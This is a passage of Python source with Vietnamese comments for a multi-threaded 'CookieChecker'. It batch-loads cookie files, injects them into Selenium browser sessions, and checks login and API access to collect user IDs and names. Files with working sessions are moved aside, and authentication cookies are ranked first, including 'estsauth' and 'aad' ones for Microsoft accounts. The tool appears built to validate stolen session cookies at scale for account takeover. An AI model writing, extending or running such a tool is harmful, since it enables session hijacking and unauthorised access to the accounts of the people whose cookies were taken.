        self.login_verifier = login_verifier or LoginVerifier(
            config=self.config, 
            logger=self.logger
        )
        self.api_verifier = api_verifier or ApiVerifier(
            config=self.config,
            logger=self.logger
        )
        self.instance_id = str(uuid.uuid4())[:8]
        self.session_stats = {
            "start_time": datetime.now(),
            "end_time": None,
            "total_checked": 0,
            "valid_count": 0,
            "invalid_count": 0,
            "error_count": 0,
        }
        self._resource_lock = threading.RLock()
        self.logger.debug(f"Khởi tạo CookieChecker (id={self.instance_id})")
        self.driver = None  # Sẽ được thiết lập từ driver_session

    @contextmanager
    def driver_session(self):
        """
        Context manager để quản lý phiên driver, đảm bảo trả driver về pool
        sau khi sử dụng.
        """
        driver = gen = profile_id = None
        try:
            driver, gen, profile_id = self.driver_pool.get_driver()
            self.logger.debug(f"Đã lấy driver cho profile {profile_id}")
            self.driver = driver  # Set the driver attribute for other methods to use
            yield driver
        finally:
            if driver and gen and profile_id:
                self.logger.debug(f"Trả driver về pool cho profile {profile_id}")
                self.driver_pool.return_driver(driver, gen, profile_id)
                self.driver = None  # Clear the driver attribute

    def check_cookie_file(self, cookie_file: str) -> Tuple[bool, Dict]:
        """
        Kiểm tra file cookie và trả về (is_valid, details).
        Cookie chỉ được coi là hợp lệ khi cả hai điều kiện đều đạt:
        - Đăng nhập thành công (login_success)
        - Xác thực API thành công (api_success)
        Giá trị final_validation = login_success AND api_success là kết quả cuối cùng.
        
        Args:
            cookie_file: Đường dẫn tới file cookie cần kiểm tra
            
        Returns:
            Tuple[bool, Dict]: (is_valid, chi tiết kết quả) với is_valid dựa trên final_validation
        """
        file_path = Path(cookie_file)
        self.logger.info(f"=== [CHECK] Đang kiểm tra cookie: {file_path.name} ===")
        result_details = {
            "filename": file_path.name,
            "full_path": str(file_path.resolve()),
            "timestamp": datetime.now().isoformat(),
            "cookies_parsed": 0,
            "cookies_by_domain": {},
            "domains_added": 0,
            "login_check_url": self.config.login_check_url,
            "login_status": None,
            "login_method": None,
            "error": None,
            "error_phase": None,
            "page_title": None,
            "has_mfa_elements": False,
            "has_logout_button": False,
            "api_check_performed": False,
            "api_check_status": False,
            "user_id": None,
            "display_name": None,
            "domain_name": None,
            "api_error": None,
            "final_validation": False,
            "performance_metrics": {}
        }
        
        # Ghi lại thời gian bắt đầu để đo hiệu suất
        start_time = time.time()
        
        # Bước 1: Kiểm tra nhanh và xử lý file cookie
        try:
            # Thêm kiểm tra tồn tại file
            if not file_path.exists():
                msg = f"File không tồn tại: {file_path.name}"
                self.logger.error(msg)
                result_details["error"] = msg
                result_details["error_phase"] = "file_check"
                return False, result_details
                    
            # Kiểm tra kích thước file
            if file_path.stat().st_size == 0:
                msg = f"File trống (0 byte): {file_path.name}"
                self.logger.error(msg)
                result_details["error"] = msg
                result_details["error_phase"] = "file_check"
                return False, result_details
            
            # Xử lý file cookie với cơ chế bắt lỗi tốt hơn
            try:
                cookies_by_domain = self.cookie_processor.process_file(str(file_path))
                total_cookies = sum(len(domain_cookies) for domain_cookies in cookies_by_domain.values())
                result_details["cookies_parsed"] = total_cookies
                
                for domain, domain_cookies in cookies_by_domain.items():
                    result_details["cookies_by_domain"][domain] = len(domain_cookies)
                    
                if not cookies_by_domain or total_cookies == 0:
                    msg = f"Không parse được cookie từ file {file_path.name}"
                    self.logger.warning(msg)
                    result_details["error"] = msg
                    result_details["error_phase"] = "cookie_parsing"
                    return False, result_details
                    
                # Kiểm tra xem file có chứa domain quan trọng không
                required_domains = set(self.config.domain_url_map.keys())
                found_domains = set(cookies_by_domain.keys())
                
                if len(found_domains.intersection(required_domains)) == 0:
                    msg = f"File không chứa cookie cho bất kỳ domain quan trọng nào: {', '.join(required_domains)}"
                    self.logger.warning(msg)
                    result_details["error"] = msg
                    result_details["error_phase"] = "cookie_validation"
                    return False, result_details
                    
            except Exception as e:
                error_msg = f"Lỗi khi xử lý file cookie: {type(e).__name__}: {str(e)}"
                self.logger.error(error_msg)
                result_details["error"] = error_msg
                result_details["error_phase"] = "cookie_parsing"
                return False, result_details

            # Bước 2: Tương tác WebDriver và kiểm tra đăng nhập
            driver = None
            gen = None
            profile_id = None
            driver_acquisition_time = time.time()
            
            try:
                # Lấy driver từ pool với cơ chế retry tăng cường
                max_driver_retries = 3  # Tăng số lần retry
                driver_retry_count = 0
                
                while driver_retry_count <= max_driver_retries:
                    try:
                        # Gọi get_driver với timeout hợp lý
                        driver, gen, profile_id = self.driver_pool.get_driver()
                        driver_acquisition_time = time.time() - driver_acquisition_time
                        result_details["performance_metrics"]["driver_acquisition"] = driver_acquisition_time
                        
                        # Kiểm tra execution context trước khi sử dụng
                        if not self._verify_execution_context(driver):
                            raise WebDriverException("Driver không có execution context hợp lệ")
                            
                        self.logger.info(f"Đã lấy driver với profile {profile_id}")
                        break
                        
                    except (WebDriverException, WebDriverPoolError) as e:
                        driver_retry_count += 1
                        error_msg = str(e).lower()
                        
                        # Xử lý thông minh hơn dựa trên loại lỗi
                        if "no such execution context" in error_msg:
                            self.logger.warning(f"Phát hiện lỗi execution context ({driver_retry_count}/{max_driver_retries})")
                        elif "no such window" in error_msg:
                            self.logger.warning(f"Phát hiện lỗi window đã đóng ({driver_retry_count}/{max_driver_retries})")
                        else:
                            self.logger.warning(f"Thử lại lấy driver ({driver_retry_count}/{max_driver_retries}): {str(e)}")
                        
                        # Trả về driver hiện tại nếu có
                        if driver and gen and profile_id:
                            try:
                                self.driver_pool.return_driver(driver, gen, profile_id)
                            except Exception:
                                pass
                            driver = gen = profile_id = None
                        
                        # Chờ trước khi thử lại với backoff tăng dần
                        backoff_time = 1 * (1.5 ** (driver_retry_count - 1))
                        time.sleep(backoff_time)
                        
                        # Nếu đã hết số lần thử, báo lỗi
                        if driver_retry_count > max_driver_retries:
                            error_msg = f"Lỗi lấy driver sau {max_driver_retries} lần thử: {str(e)}"
                            self.logger.error(error_msg)
                            result_details["error"] = error_msg
                            result_details["error_phase"] = "driver_acquisition"
                            return False, result_details
                
                # Context manager tự viết
                try:
                    # Bước 2.1: Xóa dữ liệu trình duyệt
                    clear_start_time = time.time()
                    try:
                        # Kiểm tra execution context trước khi thực hiện
                        if not self._verify_execution_context(driver):
                            raise WebDriverException("Driver không có execution context trước khi xóa dữ liệu trình duyệt")

                        # Xác định tham số cấu hình xóa dữ liệu
                        use_settings_page = getattr(self.config, 'clear_data_use_settings', True)
                        time_range = getattr(self.config, 'clear_data_time_range', 'all_time')
                        
                        self.logger.info(
                            f"Xóa dữ liệu trình duyệt: "
                            f"{'Phương pháp Settings' if use_settings_page else 'Phương pháp CDP'}, "
                            f"time_range={time_range}"
                        )
                        
                        # Xóa dữ liệu với timeout giảm để tránh treo
                        clear_timeout = min(15, self.config.get_timeout("page_load", 30) / 2)
                        clear_success = clear_browsing_data(
                            driver, 
                            self.config.domain_url_map, 
                            use_settings_page=use_settings_page,
                            time_range=time_range,
                            verify_connection=True,
                            timeout=clear_timeout
                        )
                        
                        result_details["performance_metrics"]["clear_data"] = time.time() - clear_start_time
                        
                        if not clear_success:
                            self.logger.warning("Có lỗi khi xóa dữ liệu trình duyệt. Tiếp tục xử lý...")
                            
                    except Exception as e:
                        error_msg = str(e).lower()
                        
                        # Phân loại lỗi cụ thể
                        if "no such execution context" in error_msg:
                            self.logger.warning("Lỗi execution context khi xóa dữ liệu trình duyệt")
                            # Thử phục hồi execution context
                            if not self._try_restore_execution_context(driver):
                                raise WebDriverException("Không thể phục hồi execution context")
                        elif "no such window" in error_msg:
                            self.logger.warning("Cửa sổ đã đóng khi xóa dữ liệu trình duyệt")
                            raise WebDriverException("Cửa sổ đã đóng")
                        else:
                            # Đối với lỗi khác, ghi log nhưng vẫn tiếp tục
                            self.logger.warning(f"Lỗi khi xóa dữ liệu trình duyệt: {type(e).__name__}: {str(e)}")

                    # Bước 2.2: Tiêm cookie với xử lý lỗi tốt hơn
                    inject_start_time = time.time()
                    try:
                        # Kiểm tra execution context trước khi tiêm cookie
                        if not self._verify_execution_context(driver):
                            raise WebDriverException("Driver không có execution context trước khi tiêm cookie")
                            
                        success_domains = self._add_cookies_adaptive(driver, cookies_by_domain)
                        result_details["domains_added"] = success_domains
                        result_details["performance_metrics"]["cookie_injection"] = time.time() - inject_start_time
                        
                        if success_domains == 0:
                            msg = "Không thêm được cookie cho bất kỳ domain nào"
                            self.logger.warning(msg)
                            result_details["error"] = msg
                            result_details["error_phase"] = "cookie_injection"
                            return False, result_details
                            
                    except Exception as e:
                        error_msg = str(e).lower()
                        
                        if "no such execution context" in error_msg:
                            error_log = "Lỗi execution context khi tiêm cookie"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "cookie_injection"
                            return False, result_details
                        elif "no such window" in error_msg:
                            error_log = "Cửa sổ đã đóng khi tiêm cookie"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "cookie_injection"
                            return False, result_details
                        else:
                            error_log = f"Lỗi khi tiêm cookie: {type(e).__name__}: {str(e)}"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "cookie_injection"
                            return False, result_details

                    # Bước 2.3: Lấy page title (không quan trọng)
                    try:
                        if self._verify_execution_context(driver):
                            result_details["page_title"] = driver.title
                    except Exception:
                        pass

                    # Bước 2.4: Kiểm tra đăng nhập
                    login_start_time = time.time()
                    try:
                        # Kiểm tra execution context trước khi kiểm tra đăng nhập
                        if not self._verify_execution_context(driver):
                            raise WebDriverException("Driver không có execution context trước khi kiểm tra đăng nhập")
                            
                        # Đảm bảo timeout login check hợp lý để tránh treo
                        login_check_timeout = min(30, max(15, self.config.get_timeout("login_check", 20)))
                        
                        # Khi gọi verify_login_status, đảm bảo có timeout hợp lý
                        # Cần sửa mã trong LoginVerifier để chấp nhận tham số timeout
                        login_success, login_details = self.login_verifier.verify_login_status(driver)
                        result_details.update(login_details)
                        result_details["performance_metrics"]["login_verification"] = time.time() - login_start_time

                        if not login_success:
                            self.logger.info(f"Kiểm tra đăng nhập thất bại: {login_details.get('login_method', 'unknown')}")
                            return False, result_details
                            
                    except Exception as e:
                        error_msg = str(e).lower()
                        
                        if "no such execution context" in error_msg:
                            error_log = "Lỗi execution context khi kiểm tra đăng nhập"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "login_verification"
                            return False, result_details
                        elif "no such window" in error_msg:
                            error_log = "Cửa sổ đã đóng khi kiểm tra đăng nhập"
                            self.logger.error(error_log)
                            result_details["error"] = error_log 
                            result_details["error_phase"] = "login_verification"
                            return False, result_details
                        else:
                            error_log = f"Lỗi khi kiểm tra đăng nhập: {type(e).__name__}: {str(e)}"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "login_verification"
                            return False, result_details

                    # Bước 2.5: Xác thực API
                    api_start_time = time.time()
                    try:
                        # Kiểm tra execution context trước khi xác thực API
                        if not self._verify_execution_context(driver):
                            raise WebDriverException("Driver không có execution context trước khi xác thực API")
                            
                        self.logger.info("Đăng nhập thành công, tiến hành kiểm tra API")
                        result_details["api_check_performed"] = True
                        
                        # Khi gọi verify_user_data, đảm bảo có timeout hợp lý
                        api_success, api_details = self.api_verifier.verify_user_data(driver)
                        result_details.update(api_details)
                        result_details["performance_metrics"]["api_verification"] = time.time() - api_start_time
                        
                        # Mấu chốt: final_validation = login_success AND api_success
                        final_validation = login_success and api_success
                        result_details["final_validation"] = final_validation
                        
                        if api_success:
                            self.logger.info(f"Kiểm tra API thành công: ID={api_details.get('user_id', 'unknown')}, Name={api_details.get('display_name', 'unknown')}")
                        else:
                            self.logger.warning(f"Kiểm tra API thất bại: {api_details.get('api_error', 'Unknown error')}")
                        
                        # Ghi nhận tổng thời gian xử lý
                        result_details["performance_metrics"]["total_time"] = time.time() - start_time
                        
                        return final_validation, result_details
                        
                    except Exception as e:
                        error_msg = str(e).lower()
                        
                        if "no such execution context" in error_msg:
                            error_log = "Lỗi execution context khi xác thực API"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "api_verification"
                            result_details["api_error"] = error_log
                            
                            # Logic xác minh - API thất bại = cookie không hợp lệ
                            result_details["final_validation"] = False
                            return False, result_details
                        elif "no such window" in error_msg:
                            error_log = "Cửa sổ đã đóng khi xác thực API"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "api_verification"
                            result_details["api_error"] = error_log
                            
                            # Logic xác minh - API thất bại = cookie không hợp lệ
                            result_details["final_validation"] = False
                            return False, result_details
                        else:
                            error_log = f"Lỗi khi xác thực API: {type(e).__name__}: {str(e)}"
                            self.logger.error(error_log)
                            result_details["error"] = error_log
                            result_details["error_phase"] = "api_verification"
                            result_details["api_error"] = error_log
                            
                            # Logic xác minh - API thất bại = cookie không hợp lệ
                            result_details["final_validation"] = False
                            return False, result_details
                            
                finally:
                    # Đảm bảo trả driver về pool với thông tin về trạng thái health
                    if driver and gen and profile_id:
                        try:
                            # Kiểm tra driver health trước khi trả về pool
                            driver_healthy = self._verify_execution_context(driver)
                            self.driver_pool.return_driver(driver, gen, profile_id, 
                                                        priority=-10 if not driver_healthy else 0)
                            self.logger.debug(f"Đã trả driver với profile {profile_id} về pool" + 
                                            "" if driver_healthy else " (không khỏe)")
                        except Exception as e:
                            self.logger.warning(f"Lỗi khi trả driver về pool: {str(e)}")
                        
            except InvalidSessionIdException as e:
                error_msg = f"Phiên WebDriver không hợp lệ: {str(e)}"
                self.logger.error(error_msg)
                result_details["error"] = error_msg
                result_details["error_phase"] = "webdriver_session"
                
                # Đảm bảo trả driver về pool nếu có thể
                if driver and gen and profile_id:
                    try:
                        self.driver_pool.return_driver(driver, gen, profile_id, priority=-50)
                    except Exception:
                        pass
                        
                return False, result_details
                    
            except Exception as e:
                error_msg = f"Lỗi khi xử lý WebDriver session: {type(e).__name__}: {str(e)}"
                self.logger.error(error_msg)
                result_details["error"] = error_msg
                result_details["error_phase"] = "webdriver_session"
                
                # Đảm bảo trả driver về pool nếu có thể
                if driver and gen and profile_id:
                    try:
                        self.driver_pool.return_driver(driver, gen, profile_id, priority=-50)
                    except Exception:
                        pass
                        
                return False, result_details
                    
        except Exception as e:
            # Xử lý bất kỳ ngoại lệ nào ở cấp cao nhất
            error_msg = f"Lỗi chung khi kiểm tra cookie: {type(e).__name__}: {str(e)}"
            self.logger.error(error_msg)
            result_details["error"] = error_msg
            result_details["error_phase"] = "general_exception"
            result_details["final_validation"] = False
            return False, result_details

        # Nếu đến được đây, đây là lỗi logic
        self.logger.warning("Không rõ kết quả kiểm tra cookie - đây là một lỗi logic")
        result_details["error"] = "Không rõ kết quả - lỗi logic trong mã"
        result_details["error_phase"] = "logic_error"
        result_details["final_validation"] = False
        return False, result_details

    def _verify_execution_context(self, driver) -> bool:
        """
        Kiểm tra execution context của driver có hợp lệ không bằng cách 
        thực thi một JavaScript đơn giản và an toàn.
        
        Args:
            driver: WebDriver instance cần kiểm tra
            
        Returns:
            bool: True nếu execution context còn hoạt động, False nếu đã mất
        """
        if not driver:
            return False
            
        try:
            # Sử dụng một script JavaScript đơn giản để kiểm tra execution context
            result = driver.execute_script("return navigator.userAgent")
            # Kiểm tra thêm kết quả có hợp lệ không
            if not result or not isinstance(result, str):
                self.logger.debug("Execution context không ổn định (userAgent không hợp lệ)")
                return False
            return True
        except Exception as e:
            error_msg = str(e).lower()
            if "no such execution context" in error_msg:
                self.logger.debug("Phát hiện lỗi 'no such execution context'")
            elif "no such window" in error_msg:
                self.logger.debug("Phát hiện lỗi 'no such window'")
            else:
                self.logger.debug(f"Lỗi kiểm tra execution context: {str(e)}")
            return False

    def _try_restore_execution_context(self, driver) -> bool:
        """
        Thử phục hồi execution context bằng cách mở một tab mới hoặc thực hiện điều hướng an toàn.
        
        Args:
            driver: WebDriver instance cần phục hồi
            
        Returns:
            bool: True nếu phục hồi thành công, False nếu thất bại
        """
        if not driver:
            return False
            
        try:
            # Kiểm tra window handles hiện tại
            try:
                handles = driver.window_handles
                if not handles:
                    self.logger.debug("Không có window handles, không thể phục hồi")
                    return False
            except Exception:
                self.logger.debug("Không thể lấy window handles")
                return False
                
            # Chiến lược 1: Thử chuyển đến tab đầu tiên
            try:
                driver.switch_to.window(driver.window_handles[0])
            except Exception as e:
                self.logger.debug(f"Không thể chuyển đến tab đầu tiên: {str(e)}")
                return False
                
            # Chiến lược 2: Thử điều hướng đến about:blank
            try:
                driver.get("about:blank")
                time.sleep(0.5)  # Chờ ngắn để đảm bảo trang đã load
            except Exception as e:
                self.logger.debug(f"Không thể điều hướng đến about:blank: {str(e)}")
                return False
                
            # Kiểm tra lại execution context
            try:
                result = driver.execute_script("return document.readyState")
                if result in ["complete", "interactive"]:
                    self.logger.info("Đã phục hồi execution context thành công")
                    return True
            except Exception:
                pass
                
            return False
        except Exception as e:
            self.logger.debug(f"Không thể phục hồi execution context: {type(e).__name__}: {str(e)}")
            return False

    @retry_with_backoff(max_retries=3, initial_delay=1, backoff_factor=2)
    def _add_cookies_adaptive(self, driver, cookies_by_domain: Dict[str, List[Dict]]) -> int:
        """
        Thêm cookie với chiến lược thích ứng để tối ưu hiệu suất.
        Phân chia thành các batch nhỏ, ưu tiên cookie xác thực,
        và tự động điều chỉnh kích thước batch.
        
        Args:
            driver: WebDriver instance
            cookies_by_domain: Dict chứa cookie theo domain
            
        Returns:
            int: Số domain đã thêm cookie thành công
        """
        # Kiểm tra shutdown ngay từ đầu hàm
        if is_shutdown_requested():
            raise RuntimeError("Shutdown requested - dừng thêm cookie")

        success_domains = 0
        batch_size = self.config.initial_batch_size
        min_batch_size = self.config.min_batch_size
        max_batch_size = self.config.max_batch_size
        prioritize_auth = self.config.prioritize_auth

        for domain, cookie_list in cookies_by_domain.items():
            # Kiểm tra shutdown trước mỗi loop lớn
            if is_shutdown_requested():
                raise RuntimeError("Shutdown requested - dừng processing domain")

            if domain not in self.config.domain_url_map:
                self.logger.warning(f"Domain {domain} không có trong cấu hình, bỏ qua")
                continue

            domain_url = self.config.domain_url_map[domain]
            self.logger.info(f" - Mở {domain_url} để thêm {len(cookie_list)} cookie (domain={domain})")

            # Nếu số lượng cookie nhỏ hơn batch size tối thiểu, thêm một lần
            if len(cookie_list) <= min_batch_size:
                if add_cookies_for_domain(
                    driver=driver,
                    domain=domain,
                    cookie_list=cookie_list,
                    domain_url_map=self.config.domain_url_map,
                    timeout=self.config.get_timeout("cookie_inject", 3),
                    max_retries=self.config.max_retries
                ):
                    success_domains += 1
                continue

            # Sắp xếp cookie theo ưu tiên nếu cần
            if prioritize_auth:
                cookie_list = self._prioritize_auth_cookies(cookie_list)

            # Chia thành các batch
            cookie_batches = [cookie_list[i:i+batch_size] for i in range(0, len(cookie_list), batch_size)]
            batch_success_times = []
            batch_success = False

            for i, batch in enumerate(cookie_batches):
                batch_start = time.time()
                self.logger.debug(f"   Batch {i+1}/{len(cookie_batches)}: Thêm {len(batch)} cookies")
                
                success = add_cookies_for_domain(
                    driver=driver,
                    domain=domain,
                    cookie_list=batch,
                    domain_url_map=self.config.domain_url_map,
                    timeout=self.config.get_timeout("cookie_inject", 3),
                    max_retries=1
                )
                
                batch_end = time.time()
                
                if success:
                    batch_success = True
                    batch_time = batch_end - batch_start
                    batch_success_times.append(batch_time)
                    
                    # Điều chỉnh kích thước batch dựa trên hiệu suất
                    if len(batch_success_times) >= 2:
                        avg_time = sum(batch_success_times[-2:]) / 2
                        if avg_time < 1.0:
                            batch_size = min(max_batch_size, int(batch_size * 1.2))
                        elif avg_time > 3.0:
                            batch_size = max(min_batch_size, int(batch_size * 0.8))
                        self.logger.debug(f"   Thời gian batch: {avg_time:.2f}s -> Điều chỉnh batch size = {batch_size}")
                        
            if batch_success:
                success_domains += 1
        return success_domains

    def _prioritize_auth_cookies(self, cookie_list: List[Dict]) -> List[Dict]:
        """
        Sắp xếp cookie theo ưu tiên, đặt cookie xác thực lên đầu.
        
        Args:
            cookie_list: Danh sách cookie cần sắp xếp
            
        Returns:
            List[Dict]: Danh sách cookie đã sắp xếp
        """
        def get_cookie_priority(cookie):
            name = cookie.get('name', '').lower()
            # Các từ khóa liên quan đến xác thực
            auth_keywords = ['auth', 'token', 'session', 'signin', 'login', 'credential', 
                            'access', '.auth', 'jwt', 'refresh', 'id', 'estsauth', 'aad']
            
            # Điểm ưu tiên ban đầu
            priority = 0
            
            # Ưu tiên cao cho cookie xác thực
            for keyword in auth_keywords:
                if keyword in name:
                    priority += 100
                    break
                    
            # Ưu tiên httpOnly và secure cookies
            if cookie.get('httpOnly', False):
                priority += 20
                
            if cookie.get('secure', False):
                priority += 10
                
            # Ưu tiên cookie có thời hạn dài
            if 'expiry' in cookie:
                expiry = cookie['expiry']
                now = int(time.time())
                if expiry > now:
                    # Thời gian còn lại (ngày)
                    days_left = (expiry - now) / (24 * 3600)
                    if days_left > 30:
                        priority += 5
            else:
                # Cookie không có expiry (session cookie) có ưu tiên thấp hơn
                priority -= 10
                
            return priority
            
        # Sắp xếp theo thứ tự ưu tiên giảm dần
        return sorted(cookie_list, key=get_cookie_priority, reverse=True)

    def process_batch(self, files: List[Path], worker_id: int = 0) -> Dict[str, Dict]:
        """
        Xử lý một batch các file cookie.
        Cookie chỉ được coi là hợp lệ khi final_validation = True
        (tức là đạt cả login_success và api_success)
        
        Args:
            files: Danh sách các file cần kiểm tra
            worker_id: ID của worker đang xử lý
            
        Returns:
            Dict[str, Dict]: Kết quả kiểm tra cho mỗi file
        """
        results = {}
        batch_stats = {
            "total": len(files),
            "processed": 0,
            "valid": 0,
            "invalid": 0,
            "error": 0,
            "start_time": time.time()
        }
        # Kiểm tra cờ shutdown toàn cục
        if is_shutdown_requested():
            self.logger.info(f"Worker {worker_id}: Phát hiện yêu cầu shutdown, dừng xử lý batch")
            return results
        try:
            for i, file_path in enumerate(files):
                batch_msg = f"[Worker {worker_id}] File {i+1}/{len(files)}: {file_path.name}"
                self.logger.info(f"Kiểm tra {batch_msg}")
                print(f"Đang kiểm tra {batch_msg}...")
                
                try:
                    # Tính thời gian xử lý
                    start_time = time.time()
                    is_valid, details = self.check_cookie_file(file_path)
                    duration = time.time() - start_time
                    
                    # Đánh dấu trạng thái cuối cùng dựa trên final_validation
                    final_validation = details.get("final_validation", False)
                    final_status = is_valid and final_validation
                    
                    # Di chuyển file cookie nếu hợp lệ theo logic mới
                    new_path = None
                    if final_status and self.auto_save_results:
                        new_path = self.result_manager.move_valid_cookie(file_path, True, details)
                        
                    # Cập nhật kết quả
                    results[file_path.name] = {
                        "final_valid": final_status,  # Thêm tên mới cho kết quả cuối cùng
                        "valid": final_status,  # Chỉ True khi cả is_valid và final_validation đều True
                        "details": details,
                        "timestamp": datetime.now().isoformat(),
                        "worker_id": worker_id,
                        "moved_to": str(new_path) if new_path else None,
                        "duration": duration,
                        "login_success": details.get("login_status", False),
                        "api_success": details.get("api_check_status", False),
                        "final_validation": final_validation
                    }
                    
                    # Cập nhật thống kê batch
                    batch_stats["processed"] += 1
                    if final_status:
                        batch_stats["valid"] += 1
                    elif "error" in details or "api_error" in details:
                        batch_stats["error"] += 1
                    else:
                        batch_stats["invalid"] += 1
                    
                    # Hiển thị kết quả chi tiết
                    self._display_result_status(file_path.name, is_valid, details, final_validation)
                    
                    # Ghi log kết quả
                    log_status = "OK" if final_status else "FAIL"
                    if is_valid and not final_validation:
                        log_status = "LOGIN_OK_API_FAIL"
                    self.logger.info(f"Kết quả {batch_msg} => {log_status} [{duration:.2f}s]")

                    # Nếu đăng nhập thành công nhưng API thất bại, hiển thị cảnh báo
                    if is_valid and details.get("login_status", False) and not details.get("api_check_status", False):
                        self.logger.warning(f"Cookie {file_path.name} KHÔNG được di chuyển: API verification thất bại mặc dù đăng nhập thành công"
                                            f" (ID={details.get('user_id', 'unknown')}, Name={details.get('display_name', 'unknown')})")
                            
                    # Thêm kết quả vào result_manager
                    self.result_manager.add_result(file_path.name, results[file_path.name])
                    
                except InvalidSessionIdException:
                    self.logger.error(f"Phiên driver không hợp lệ: {file_path.name}")
                    results[file_path.name] = {
                        "valid": False,
                        "error": "Phiên WebDriver không hợp lệ",
                        "timestamp": datetime.now().isoformat(),
                        "worker_id": worker_id,
                        "final_validation": False
                    }
                    self.result_manager.add_result(file_path.name, results[file_path.name])
                    batch_stats["error"] += 1
                    batch_stats["processed"] += 1
                    break
                    
                except Exception as e:
                    error_msg = f"Lỗi: {type(e).__name__}: {str(e)}"
                    self.logger.error(f"Lỗi kiểm tra {batch_msg}: {error_msg}")
                    results[file_path.name] = {
                        "valid": False,
                        "error": error_msg,
                        "timestamp": datetime.now().isoformat(),
                        "worker_id": worker_id,
                        "final_validation": False
                    }
                    self.result_manager.add_result(file_path.name, results[file_path.name])
                    batch_stats["error"] += 1
                    batch_stats["processed"] += 1
                    
            # Tính toán tổng thống kê cuối cùng của batch
            batch_stats["total_time"] = time.time() - batch_stats["start_time"]
            batch_stats["avg_time"] = batch_stats["total_time"] / batch_stats["processed"] if batch_stats["processed"] > 0 else 0
            batch_stats["valid_percentage"] = (batch_stats["valid"] / batch_stats["processed"] * 100) if batch_stats["processed"] > 0 else 0
            
            # Ghi log tổng kết batch
            self.logger.info(
                f"Batch [Worker {worker_id}] hoàn tất: {batch_stats['processed']}/{batch_stats['total']} files, "
                f"Hợp lệ: {batch_stats['valid']} ({batch_stats['valid_percentage']:.1f}%), "
                f"Thời gian: {batch_stats['total_time']:.2f}s, "
                f"Trung bình: {batch_stats['avg_time']:.2f}s/file"
            )
            
        except Exception as e:
            self.logger.error(f"Lỗi phiên WebDriver (worker {worker_id}): {type(e).__name__}: {str(e)}")
            
        return results

    def _display_result_status(self, filename: str, is_valid: bool, details: Dict, final_validation: bool):
        """
        Hiển thị trạng thái kết quả kiểm tra cookie với logic mới.
        """
        login_success = details.get("login_status", False)
        api_success = details.get("api_check_status", False)
        api_performed = details.get("api_check_performed", False)
        
        # Biểu tượng đúng/sai
        valid_symbol = "✓" if is_valid and final_validation else "✗"
        
        # Thông tin chi tiết để hiển thị
        display_name = details.get("display_name", "Unknown")
        domain_name = details.get("domain_name", "")
        user_info = f"{display_name}" if not domain_name else f"{display_name}@{domain_name}"
        
        error = details.get("error", "")
        api_error = details.get("api_error", "")
        error_msg = error or api_error
        
        # Hiển thị kết quả theo logic mới
        if is_valid and final_validation:
            # Cookie hoàn toàn hợp lệ
            print(f"{valid_symbol} File {filename} -> Hoàn toàn hợp lệ (Login OK, API OK: {user_info})")
        elif is_valid and login_success and api_performed and not api_success:
            # Đăng nhập OK nhưng API thất bại
            print(f"{valid_symbol} File {filename} -> Không hợp lệ (Login OK, API FAILED)")
            if api_error:
                print(f"  Lỗi API: {api_error}")
        elif is_valid and login_success and not api_performed:
            # Đăng nhập OK nhưng không thực hiện API
            print(f"{valid_symbol} File {filename} -> Không hợp lệ (Login OK, API không thực hiện)")
        elif not is_valid and login_success:
            # Đăng nhập OK nhưng cookie không hợp lệ vì lý do khác
            print(f"{valid_symbol} File {filename} -> Không hợp lệ (Login OK, lỗi khác)")
            if error_msg:
                print(f"  Lỗi: {error_msg}")
        else:
            # Cookie không hợp lệ (không đăng nhập được)
            print(f"{valid_symbol} File {filename} -> Không hợp lệ (Login thất bại)")
            if error_msg:
                print(f"  Lỗi: {error_msg}")


    def check_multiple_cookie_files_adaptive(
        self,
        cookie_files: List[Path],
        task_scheduler: AdaptiveTaskScheduler,
        batch_size: int = 10
    ) -> None:
        """
        Kiểm tra nhiều file cookie với tự động điều chỉnh số lượng worker.
        
        Args:
            cookie_files: Danh sách các file cookie cần kiểm tra
            task_scheduler: Đối tượng AdaptiveTaskScheduler để quản lý workers
            batch_size: Kích thước batch mặc định
        """
        # Kiểm tra shutdown ngay từ đầu hàm
        if is_shutdown_requested():
            self.logger.warning("Yêu cầu shutdown đã được phát hiện, không khởi động quá trình kiểm tra")
            return

        if not cookie_files:
            self.logger.warning("Không có file cookie nào để kiểm tra")
            return

        # Lọc các file hợp lệ
        valid_files = [f for f in cookie_files if f.exists() and f.is_file()]
        invalid_files = [f for f in cookie_files if f not in valid_files]
        
        # Xử lý các file không hợp lệ
        for f in invalid_files:
            error_result = {
                "valid": False,
                "error": "File không tồn tại hoặc không phải file",
                "timestamp": datetime.now().isoformat()
            }
            self.result_manager.add_result(f.name, error_result)
            self.logger.warning(f"File không hợp lệ: {f}")

        if not valid_files:
            self.logger.error("Không có file cookie hợp lệ để kiểm tra")
            return

        # Thiết lập phiên làm việc
        self.logger.info(f"=== Bắt đầu kiểm tra {len(valid_files)} file cookie ===")
        self.session_stats = {
            "start_time": datetime.now(),
            "end_time": None,
            "total_checked": len(valid_files),
            "valid_count": 0,
            "invalid_count": 0,
            "error_count": 0,
        }

        # Chia file thành các batch
        batches = [valid_files[i:i+batch_size] for i in range(0, len(valid_files), batch_size)]
        total_batches = len(batches)
        self.logger.info(f"Chia thành {total_batches} batch, mỗi batch tối đa {batch_size} file")
        
        # Biến theo dõi tiến độ
        processed_batches = 0
        start_time = time.time()
        lock = threading.RLock()
        
        # Sử dụng semaphore để kiểm soát số lượng worker đồng thời
        worker_semaphore = threading.BoundedSemaphore(value=task_scheduler.max_workers)
        shutdown_event = threading.Event()  # Để báo hiệu khi cần dừng các worker

        # Theo dõi các batch đang được xử lý và đã hoàn thành
        active_batches = set()
        completed_results = {}
        
        def dynamic_rate_limiter():
            """Điều chỉnh số lượng worker hoạt động dựa trên optimal_workers hiện tại"""
            # Kiểm tra cờ shutdown 
            if is_shutdown_requested():
                return 1  # Giảm xuống 1 worker nếu đang shutdown
                
            current_optimal = task_scheduler.get_optimal_workers()
            # Đặt giá trị mới cho semaphore thông qua release/acquire
            current_value = worker_semaphore._value  # Cẩn thận: thuộc tính nội bộ
            
